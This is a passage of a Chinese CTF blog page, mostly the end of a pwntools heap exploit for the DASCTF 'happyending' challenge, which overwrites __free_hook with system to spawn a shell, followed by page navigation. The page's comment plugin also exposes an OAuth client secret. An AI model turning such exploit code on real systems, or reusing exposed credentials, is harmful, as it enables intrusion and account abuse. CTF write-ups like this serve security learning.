class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0xB20</span>,<span class="string">'FAKE'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x10</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">12</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x1000</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x521</span>) + <span class="string">'\x40'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#--</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- small bin </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'F'</span>) <span class="comment">#15</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'M'</span>) <span class="comment">#16</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'Y'</span>) <span class="comment">#17</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'Y'</span>) <span class="comment">#18</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#5 - 11</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">	free(<span class="number">5</span>+i)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">17</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">15</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">	new(<span class="number">0x28</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x400</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,p64(<span class="number">0</span>) + <span class="string">'\x20'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'clear'</span>) <span class="comment"># clear the small bin</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#--</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#--fast bin</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">	free(<span class="number">5</span> + i)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">16</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">14</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">	new(<span class="number">0x28</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'\x20'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'clear'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#--</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'Target'</span>) <span class="comment">#20</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x5F8</span>,<span class="string">'Last'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#new(0x100,'FMYY')</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">20</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x20</span> + p64(<span class="number">0x520</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">21</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x40</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">show(<span class="number">16</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7F'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> <span class="number">-0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">'LIBC:\t'</span> + hex(libc_base))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">rce = libc_base + <span class="number">0x106EF8</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">21</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">14</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x28</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(free_hook))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x40</span>,p64(system))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">free(<span class="number">21</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+
+<h3 id="下载-4"><a href="#下载-4" class="headerlink" title="下载"></a>下载</h3><p><a href="./happyending/main.out">MAIN</a>  <a href="./happyending/exp.py">EXP</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/05/15/Kernel/Linux_Kernel_Pwn(%E4%B8%89)/">
+                    Linux_Kernel_Pwn(三)
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Memory-Monster-I"><span class="toc-number">1.</span> <span class="toc-text">Memory Monster I</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#下载"><span class="toc-number">1.1.</span> <span class="toc-text">下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memory-Monster-II"><span class="toc-number">2.</span> <span class="toc-text">Memory Monster II</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#下载-1"><span class="toc-number">2.1.</span> <span class="toc-text">下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memory-Monster-III"><span class="toc-number">3.</span> <span class="toc-text">Memory Monster III</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#下载-2"><span class="toc-number">3.1.</span> <span class="toc-text">下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#secret2"><span class="toc-number">4.</span> <span class="toc-text">secret2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#下载-3"><span class="toc-number">4.1.</span> <span class="toc-text">下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#happyending"><span class="toc-number">5.</span> <span class="toc-text">happyending</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#下载-4"><span class="toc-number">5.1.</span> <span class="toc-text">下载</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <!-- Gitment评论插件通用代码 -->
+<div id="git"></div>
+<link rel="stylesheet" href="https://billts.site/extra_css/gitment.css">
+<script src="https://billts.site/js/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+  id: 'DASCTF_May',
+  owner: "iTassel",//github用户名
+  repo: "comments",//用户存储评论的github项目名称
+  oauth: {
+    client_id: "b6d628716b275a351d81",//注册OAuth Application时生产的ClinetID
+    client_secret:"c67272afe06e25cf34a0ddba9e4b84000a23c015",//注册OAuth Application时生成的Client Secret
+  },
+})
+gitment.render('git')
+</script>
+<!-- Gitment代码结束 -->
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2020/05/15/Kernel/Linux_Kernel_Pwn(%E4%B8%89)/" title="Next: Linux_Kernel_Pwn(三)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/05/23/Competition/DASCTF-May/">DASCTF_May</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/15/Kernel/Linux_Kernel_Pwn(%E4%B8%89)/">Linux_Kernel_Pwn(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/13/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/">网鼎杯_2020</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/Kernel/Linux_Kernel_Pwn(%E4%BA%8C)/">Linux_Kernel_Pwn(ROP)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/06/Competition/De1CTF/">De1CTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/Kernel/Linux_Kernel_Pwn(%E4%B8%80)/">Linux_Kernel_Pwn(初识)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/04/Competition/36DCTF/">36DCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/29/StackOverFlow/Ret2dl-resolve/">ret2dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/27/AWD/XMAWD/">XMAWD</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/Magic/Magic-Gadget/">Magic_Gadget</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/25/Competition/DASCTF/">DASCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/Competition/NPUCTF/">NPUCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/20/Competition/HFCTF-2020/">HFCTF_2020</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/Large%20BIN%20Attack/Large-Bin-Attack/">Large_Bin_Attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/GMF/Global_Max_Fast/">Global_Max_Fast</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/IO_FILE/IO_FILE/">IO_FILE</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/18/TCache/TCache/">TCache</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/14/Competition/GXZY/">GXZY</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/01/Competition/V-N/">V&N公开赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/25/Competition/GYCTF/">GYCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/22/Competition/HGame/">HGame</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/13/Seccomp/Seccomp/">Seccomp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/27/StackOverFlow/BROP/">BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/21/Reverse/Reverse-BOX/">Reverse_BOX</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/20/Reverse/WcyVM/">NCTF_WcyVM</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/17/Fmtstr/FmtStr_In_Heap/">FmtStr In Heap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/16/Fmtstr/FmtStr_Blind_Got/">FmtStr Blind Got</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/10/StackOverFlow/ROP/">ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/09/Study/Study/">PWN渣渣的学习记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/08/Fmtstr/FmtStr_In_BSS/">FmtStr In BSS</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2020 风沐云烟
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-area-chart" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-coffee" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "φ(≧ω≦*)♪ 嘿 ^我消失啦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "Hi~ o(*￣▽￣*)ブ 被你发现啦～" + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":180,"height":360},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
